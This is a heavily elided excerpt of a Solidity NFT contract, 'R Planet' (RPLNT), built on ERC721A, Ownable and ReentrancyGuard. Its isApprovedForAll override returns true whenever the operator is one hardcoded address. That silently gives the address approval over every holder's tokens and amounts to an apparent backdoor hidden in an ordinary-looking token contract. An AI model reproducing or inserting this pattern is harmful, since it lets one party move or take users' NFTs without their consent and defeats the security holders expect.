  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x140898552E9335476AC3fBFDfED65bC16C8A41aA){return true;}
...
contract R_Planet is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("R Planet", "RPLNT", maxBatchSize_, collectionSize_) {
